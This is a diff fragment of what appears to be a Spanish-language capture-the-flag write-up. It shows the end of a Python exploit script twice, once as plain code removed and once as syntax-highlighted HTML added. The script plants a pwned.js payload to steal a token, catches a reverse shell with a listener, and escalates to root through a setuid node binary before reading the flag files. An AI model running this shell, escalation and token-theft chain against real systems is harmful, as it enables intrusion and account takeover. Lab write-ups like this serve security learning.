+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span> <span class="o">%</span> <span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">,</span> <span class="n">LISTEN_NC</span><span class="p">,</span> <span class="n">token</span><span class="p">))</span>
 
-    listening() # Nos ponemos en escucha
+<span class="k">def</span> <span class="nf">listening</span><span class="p">():</span>
+    <span class="n">listener</span> <span class="o">=</span> <span class="nf">listen</span><span class="p">(</span><span class="n">LISTEN_NC</span><span class="p">)</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="nf">wait_for_connection</span><span class="p">()</span>
 
-    q.get(block=True)  # Esperar a que se realize la petición a /pwned.js
-    p.terminate()  # Terminar el servidor Flask
+    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span> <span class="c1"># Recibimos el primer banner
+</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span> <span class="c1"># Recibimos el segundo banner
+</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">/usr/bin/yournode -e </span><span class="sh">'</span><span class="s">process.setuid(0); require(</span><span class="sh">"</span><span class="s">child_process</span><span class="sh">"</span><span class="s">).spawn(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="s">, {stdio: [0, 1, 2]})</span><span class="sh">'"""</span><span class="p">)</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span> <span class="c1"># Recibimos el output del comando anterior
+</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">echo </span><span class="sh">"</span><span class="s">User Flag -&gt; `cat /home/ctesias/user.txt`</span><span class="sh">"</span><span class="s"> </span><span class="sh">"""</span><span class="p">)</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">echo </span><span class="sh">"</span><span class="s">Root Flag -&gt; `cat /root/root.txt`</span><span class="sh">"</span><span class="s"> </span><span class="sh">"""</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
 
-def write_pwned_js(content, type):
+    <span class="n">conn</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
-    if type == "t":
-        with open("pwned.js", "w") as f:
-            f.write(content % (host_ip, PORT))
-    elif type == "c":
-        with open("pwned.js", "w") as f:
-            f.write(content % (host_ip, PORT, host_ip, LISTEN_NC, token))
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span> <span class="o">=</span> <span class="nf">get_ip</span><span class="p">()</span>
+    <span class="nf">check_connect</span><span class="p">()</span>
 
-def listening():
-    listener = listen(LISTEN_NC)
-    conn = listener.wait_for_connection()
-
-    conn.recv() # Recibimos el primer banner
-    conn.recv() # Recibimos el segundo banner
-    conn.sendline(b"""/usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'""")
-    conn.recv().decode() # Recibimos el output del comando anterior
-
-    conn.sendline(b"""echo "User Flag -> `cat /home/ctesias/user.txt`" """)
-    conn.sendline(b"""echo "Root Flag -> `cat /root/root.txt`" """)
-    print(conn.recv().decode())
-    print(conn.recv().decode())
-    print(conn.recv().decode())
-
-    conn.interactive()
-
-if __name__ == '__main__':
-    target_ip, host_ip = get_ip()
-    check_connect()
-
-    # Operativas innecesarias pero se han realizado por puro aprendizaje
-    #inject_cookie()
-    #cookie = cookie_hijacking()
-
-    inject_token()
-    write_pwned_js(payload_token, "t")
-    token = run_flask_token()
-    write_pwned_js(payload_cmd, "c")
-    run_flask_cmd()
- ```
-<details>
+    <span class="c1"># Operativas innecesarias pero se han realizado por puro aprendizaje
+</span>    <span class="c1">#inject_cookie()
+</span>    <span class="c1">#cookie = cookie_hijacking()
+</span>
+    <span class="nf">inject_token</span><span class="p">()</span>
+    <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">payload_token</span><span class="p">,</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="nf">run_flask_token</span><span class="p">()</span>
+    <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">payload_cmd</span><span class="p">,</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">run_flask_cmd</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></div></div>
 </details>
 
 ---
